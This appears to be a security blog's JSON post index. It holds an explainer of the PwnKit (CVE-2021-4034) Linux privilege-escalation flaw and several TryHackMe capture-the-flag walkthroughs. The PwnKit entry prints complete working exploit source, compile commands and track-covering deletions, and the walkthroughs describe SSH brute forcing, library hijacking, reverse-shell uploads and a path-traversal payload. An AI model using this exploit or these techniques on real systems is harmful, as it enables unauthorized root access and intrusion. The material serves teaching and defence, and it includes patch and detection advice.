[
  
  {
    "title": "Explanation of CVE-2021-4034 a.k.a. Pwnkit",
    "url": "/posts/CVE-2021-4034-a.k.a.-Pwnkit-Explanation/",
    "categories": "Cybersecurity",
    "tags": "Linux, Vulnerabilities, Privilege-Escalation",
    "date": "2022-02-07 00:00:00 +0800",
    





    "snippet": "On January 25, 2022, security researchers at Qualys labs disclosed a Local Privilege Escalation vulnerability in Linux within Polkit’s pkexec component. Listed as CVE-2021-4034 and given a high severity rating of 7.8 out of 10, this vulnerability affects many Linux distributions including Ubuntu, Debian, Fedora, and CentOS. A proof of concept (POC) wasn’t submitted by Qualys along with their disclosure, but amazingly people started to create and upload their own POCs just hours of the announcement. At the time, I myself saw some POCs being uploaded to Github.What is Polkit and pkexec?Polkit is a program used in Linux to handle authorisation policies and determine if you have proper permissions. Pkexec, which is a component of Polkit, is a SUID-root program that allows one to execute commands as another user. If no user is specified, then Pkexec will use the root user as the default.In other words, the policy toolkit is like an alternative to the sudo command that most Linux users are familiar with. If you were to run a command such as pkexec whoami, you would be prompted for a password and then when entered, the output of the command would be “root”.How it WorksDirector of Vulnerability and Threat Research at Qualys, Bharat Jogi, explains PwnKit as “a memory corruption vulnerability in Polkit, which allows any unprivileged user to gain full root privileges on a vulnerable system using default polkit configuration”.While the vulnerability won’t give initial system access to an attacker, it’s still a significant vulnerablity for a couple of reasons:  The vulnerability would give an attacker full control of a Linux system  It has existed for 12 years ever since Policy Kit’s first release in 2009 and so any unpatched Linux systems in that timeline is vulnerable  It is easy to exploitThe reason to why pkexec was vulnerable is because it mishandles command line arguments. In Linux C Programs, the first argument would be assigned to the name of the executable itself. However it is also possible to specify an empty list without the executable name and using the execve function to call the executable. In this case, the program would rely that the first argument to call the executable name which can lead to memory corruption vulnerabilities. What makes pkexec special is that it is SUID and has special file permissions that allow it to run as the original owner which is root. What pwnkit does is list no arguments to pkexec resulting in corrupted memory and allowing an attacker to obtain root privileges.For a more detailed and technical explanation, see Qualys’ blog post.ExploitationWith just two small files and a couple of Linux commands, an attacker can exploit the vulnerability within a minute.The first file we need is called evil-so.c which contains the code:`#include #include #include void gconv() {}void gconv_init() {    setuid(0);    setgid(0);    setgroups(0);execve(&quot;/bin/sh&quot;, NULL, NULL); } `The second file we need is called exploit.c which has the contents:`#include #include #define BIN “/usr/bin/pkexec”#define DIR “evildir”#define EVILSO “evil”int main(){    char *envp[] = {        DIR,        “PATH=GCONV_PATH=.”,        “SHELL=ryaagard”,        “CHARSET=ryaagard”,        NULL    };    char *argv[] = { NULL };system(&quot;mkdir GCONV_PATH=.&quot;);system(&quot;touch GCONV_PATH=./&quot; DIR &quot; &amp;amp;&amp;amp; chmod 777 GCONV_PATH=./&quot; DIR);system(&quot;mkdir &quot; DIR);system(&quot;echo &#39;module\\tINTERNAL\\t\\t\\tryaagard//\\t\\t\\t&quot; EVILSO &quot;\\t\\t\\t2&#39; &amp;gt; &quot; DIR &quot;/gconv-modules&quot;);system(&quot;cp &quot; EVILSO &quot;.so &quot; DIR);execve(BIN, argv, envp);return 0; } `To get these files onto the system, you can either copy and paste them into the target system into 2 different files with their respective names, use SCP if SSH is enabled, or use curl/wget to download the files online anywhere.After you have the files on the system, execute the commands: gcc -shared -o evil.so -fPIC evil-so.c and then execute gcc again with gcc exploit.c -o exploit command. You can cover some of your tracks with rm -r ./GCONV_PATH=. &amp;amp;&amp;amp; rm -r ./evildir &amp;amp;&amp;amp; rm exploit &amp;amp;&amp;amp; rm evil.so or you can just execute the program with ./exploit and then obtain root privilege.If you’re looking to try and exploit the vulnerability, TryHackMe has released a room in which you can play around with.Solutions and MitigationsAt the same time the vulnerability was disclosed, an update has been released for all Linux systems to patch the vulnerability. On Ubuntu and Debian systems, an update can be applied using apt with the sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y command. If for whatever reason, you can’t patch your system, Qualys recommends removing the SUID-bit from pkexec as a temporary mitigation. The command for that would be sudo chmod 0755 /usr/bin/pkexec.If you think your system has been affected by the vulnerability, look at your logs and look for entries within the lines of “The value for the SHELL variable was not found the /etc/shells file” or “The value for environment variable […] contains suspicious content.” Unfortunately however there are many variations of Pwnkit in which some uses different environment variables and exploits the vulnerability in different ways. This means that some exploits will leave traces and be detected by logs and some will not.Referenceshttps://www.bleepingcomputer.com/news/security/linux-system-service-bug-gives-root-on-all-major-distros-exploit-released/https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txthttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034https://nvd.nist.gov/vuln/detail/CVE-2021-4034https://www.exploit-db.com/exploits/50689https://www.schneier.com/blog/archives/2022/01/twelve-year-old-linux-vulnerability-discovered-and-patched.html"
  },
  
  {
    "title": "How to Hack your Ex-girlfriend&#39;s Instagram Account",
    "url": "/posts/How-to-Hack-Your-Ex-Girlfriend's-Instagram-Account/",
    "categories": "Uncategorized",
    "tags": "",
    "date": "2022-01-27 00:00:00 +0800",
    





    "snippet": "Scenario: You’ve recently broke up with your ex and has blocked you on all social media including Instagram. Now you’re looking for a way to break into her IG account and get back at her.Well you won’t find the way to do it here. (͡° ͜ʖ ͡°)"
  },
  
  {
    "title": "THM Library Walkthrough",
    "url": "/posts/THM-Library-Walkthrough/",
    "categories": "Writeups",
    "tags": "TryHackMe, CTF, Network-Attacks",
    "date": "2022-01-18 00:00:00 +0800",
    





    "snippet": "The THM library room is a room created to practice SSH network service brute forcing and Python library hijacking.EnumerationA little after booting the machine, I start with a nmap scan.In less than 6 seconds, I see that there are only two ports available. Using the OWASP ZAP, I visited the website.On the website we don’t see much, however we do see the username “meliodas” and 3 other usernames. Which I assumed to also be a username on the system.Walking around the website, there is very little. Even the hyperlinks on the navigation bar didn’t lead to any new webpages, so I went back to enumerating more.Using the automated scan feature on ZAP, I found the robots.txt to have something interesting.The robots.txt on the site contained “rockyou” which is a very popular password cracking wordlist.ExploitationWith the little hint in robots.txt, I suspected that the user meliodas had weak credentials. Using hydra, I began to brute force the machine’s SSH service.After the valid credentials were found, I logged in, checked sudo privileges and then read the user.txt file.Privilege EscalationAfter entering the contents of user.txt into the answer bar, I started to look at bak.py to see if I could abuse the script to obtain root privilege. The script isn’t writable, but it is executable.Looking at the script, I see that the os and zipfile libraries are being used. After some research, I learned that I can escalate privileges by hijacking any of the two libraries that are being used in the python script.Using a malicious zipfile.py, I then copied it unto the machine using nano. Although you can also use scp.By executing bak.py, python will first look into the same directory as the script to see if there are any custom libraries that could be recalled. If a custom library is in the same directory as the script, the custom library will be prioritzed and called first rather than where the default libraries of Python are located.This trick has been patched however and now Python will call libraries from the default location before calling libraries on the same directory as the script. For this reason, it’s note likely to happen on the real world, but could still happen when doing CTFs on older machines.Once I executed the script and received a connection on netcat, I then read the root.txt file."
  },
  
  {
    "title": "THM Anonforce Writeup",
    "url": "/posts/THM-Anonforce-Writeup/",
    "categories": "Writeups",
    "tags": "TryHackMe, CTF",
    "date": "2022-01-17 00:00:00 +0800",
    





    "snippet": "Anonforce is an easy room on TryHackMe created to test password cracking skills.ReconStarting with a nmap scan, I see that there are two ports open which are FTP and SSH.A more aggressive port scan reveals that that the FTP service has anonymous login enabled.Not only that but it seems I have access to the root directory machine although not root privileges. Looking into the home directory, there is the user “melodias” and in his home directory is the user.txt file.After a little time looking around, I noticed that there is the directory notread in the root directory. I downloaded the files private.asc which seems to be a private pgp key and backup.pgp which is an encrypted message presumably by the pgp key.Exploitation - Weak PasswordsAfter downloading the files, I get ready to import and decrypt the PGP message only to find out that the private key is password protected. Using gpg2john, I created a recognizable password hash for JohnTheRipper to crack. The wordlist I used was the 10k-most-common.txt which cracked the password in less than a minute.The contents of backup.pgp is what seemed to be the shadow file which contains all the password hashes of users in a Linux machine. For this scenario, I used unshadow and just like the last one, I used it to generate a recognizable hash for JohnTheRipper. The passwd file is also required to use unshadow, but that can be obtained using FTP.Whichever wordlist you choose makes a whole lot of difference. In my first cracking attempt, I used  the default wordlist for JTR which led to my computer running for an entire hour. Afterwards, I stopped the process because I thought this amount of time for password cracking was unusual for an easy level room. So I switched wordlists and using 10-million-password-list-top-1000000.txt from SecLists, I cracked the password in less than 20 seconds. After discovering the password, I logged in through SSH and read the root.txt file."
  },
  
  {
    "title": "TryHackMe Lazy Admin Walkthrough",
    "url": "/posts/THM-Lazy-Admin-Walkthrough/",
    "categories": "Writeups",
    "tags": "Linux, Vulnerabilities, TryHackMe, CTF",
    "date": "2022-01-07 00:00:00 +0800",
    





    "snippet": "Lazy Admin is a an easy CTF room on TryHackMe that will test one’s enumeration and linux skills.ReconAfter deploying the machine, I did a mandatory nmap scan to see what ports are open and what network services are being used.Here we see that there are 2 network services running on the machine. With a Firefox browser, I visited the website on port 80. Once on the site, I am greeted with the Apache2 Default Page. There’s nothing else to do here, so I went back to doing more enumeration and information gathering.Using Ffuf, I looked for what other directories are available on the website.I then discovered the directory “content” and visited it.Here I see that it’s another default page that’s under construction. However there is something interesting. “SweetRice” is what’s being used to manage the content on the site. Using this information, we can search for any available vulnerabilities that we can use on the site.On the site Exploit-DB I discover that there are a number of vulnerabilities that I can use. I looked at the most severe vulnerability that would allow PHP Code Execution, but I tested it and it didn’t seemed to have worked. The vulnerabilities that allow Arbitrary File Uploading and Downloading would only work with valid credentials to the CMS. So there’s only one vulnerability left, that being Backup Disclosure.The exploit report stated that a mysql backup file can be accessed on the site in the directory /inc/mysql_backup. A vulnerability like this can lead to gaining access to the CMS and being able to use the file upload and download vulnerabilities. So with that I took a look at the URI http://thm_host.thm/content/inc/mysql_backup and I discover there to be a MySQL backup file. Seeing it, I downloaded it and took a look at it’s contents.Analyzing the file, I see that there is the username “manager” with what looks to be a hashed password.ExploitationUsing CrackStation, a popular password hash cracking site, I entered the hash and discovered what the password was.Now I just needed to use the credentials on a login. Looking back at the vulnerability reports on arbitrary file uploading and downloading, there was the directory “as”. At the same time, my Ffuf enumeration picked up on it.It wasn’t necessary to enumerate the site again, but it’s always good to keep some sort of scan running in the background.After checking the credentials to be valid, we can then leverage the Arbitrary File Upload vulnerability to achieve a reverse shell connection. There are two ways we can do it. One is to login to the site, upload the shell and view it on a browser to execute it, or use the python script on exploit-db. I did the former.Once I attempted to upload a shell onto the site, I saw that my uploads weren’t appearing on the site. After a moment, I realized there was likely some sort of filter being used on the files being uploaded to the site. So I changed the file extension of my file from “shell.php” to “shell.php5”. After uploading the file, I saw it, executed the file, and achieved a reverse shell connection.First thing I did was list all the users in the home directory and then list all the contents of the user itguy’s files and directories. I then read the user.txt file.Privilege EscalationNow that I’ve managed to connect to the machine, I then proceeded to escalate my privileges to root.Other than user.txt, I noticed that there is the file backup.pl which is a script written in the perl programming language.I checked crontab to see if it is set to execute by root every so often but that was not the case. So I then checked if there are any sudo privileges www-data had and as we can see, we can execute the script using sudo without a password.Although the script backup.pl itself isn’t writable, it executes commands in the file copy.sh located in /etc/ which is a writable file. By overwriting copy.sh, we can execute commands using root privilegesAt this point, I could either create another reverse shell that would be in root or just execute a command that would read the root.txt file. I did the latter."
  },
  
  {
    "title": "TryHackMe Vulnerability Capstone Writeup",
    "url": "/posts/THM-Vulnerability-Capstone/",
    "categories": "Writeups",
    "tags": "Vulnerabilities, CTF, TryHackMe",
    "date": "2021-12-27 00:00:00 +0800",
    





    "snippet": "The THM room Vulnerability Capstone is a CTF room built to practice your vulnerability and exploit researching skills.ReconOnce the machine has started, we do a quick mandatory nmap scan to see what network services are running on the machine.Here we see that there are two ports open, SSH and HTTP. Using a browser, we then take a look at the website.Immediately we are greeted by the default page of FUEL, a CMS software. The bottom version is also displayed to be 1.4. Both of which are the answers to questions 1 and 2 on task 2.The next question then asks what is the CVE ID that allows an attacker to remotely execute code on the web application. Here we can do two things, which is go straight to Google and search with the query “Fuel CMS 1.4 exploits” or search a vulnerability database such as Exploit-DB.On this webpage we see there are 3 exploits specifically that will allow RCE. Visiting any of the links will lead to the exploit code and the CVE ID which is CVE-2018-16763, the answer to question 3 on task 2.ExploitationNext is what I thought to be challenging as it took more time that I thought it should.Viewing each of the exploits, we see that they are each built slightly differently with one being made in python2, another in ruby, and the last in python3. I chose the python3 script by Padsala Trushal because I am familiar with the langauge and it was up to date.However to my surprise, the exploit didn’t work and just returns “system” whenever I attempted to execute a command. I then tried the other two exploits on the list but both of them also didn’t work.I looked back in the questions on the page and I reread the note that said “There are numerous exploits out there that can be used for this vulnerability (some more useful than others!)”. The way I interpretted this was that there are many exploits but not all of them would work. So we’re back into recon.From what I know, Github is a very well known site for programmers but it is also used by security engineers. Sometimes people would create their own custom exploits for CVEs making Github useful to search for exploits sometimes. Using the query “site:github.com CVE-2018-16763 exploit” on a search engine, I then went through pages of github repositories looking for an exploit that worked. The first one looked promising but I was disappointed as I couldn’t read the flag file.After a long while, I finally found an exploit that worked which was a bash script made by k4is3r13. Using it, we can then either create a reverse shell, or just read the flag file off /home/ubuntu/.Although I strugged a little bit finding an exploit that worked, it was satisfying to have finally found one with all that work. Overall this is a great room to practicing vulnerability and exploit researching skills."
  },
  
  {
    "title": "TryHackMe Inclusion Writeup",
    "url": "/posts/THM-Inclusion/",
    "categories": "Writeups",
    "tags": "TryHackMe, CTF, Web-Attacks",
    "date": "2021-12-23 00:00:00 +0800",
    





    "snippet": "The TryHackMe inclusion room is a beginner CTF room created to practice exploiting a local file inclusion (LFI) vulnerability in a web server. Once you have booted up the machine, let’s get started with a simple nmap scan.EnumerationWith a nmap scan, we can see that we have two ports that are open.Using your HTTP proxy software of choice (I use OWASP ZAP) we then visit the website.Looking around the website and clicking any of the “View details” links, we are displayed different text all of which are requested using the name= parameter in the URL. We can assume that this parameter is vulnerable to LFI. To test it, we can input the text ../../../../../etc/passwd into the parameter which makes a request to show the passwd file in the Linux machine.Here we see confirm that name= is in fact vulnerable to LFI and we see the user falconfeast and credentials.ExploitFrom here, there are two ways to read the user.txt and root.txt files. One is to use the credentials in the passwd file to login with SSH, escalate privileges and read the files or to just leverage the LFI vulnerability and read the files. I did the latter as I tested a guess to where the user.txt file is and I discovered that root.txt was also readable."
  }
  
]

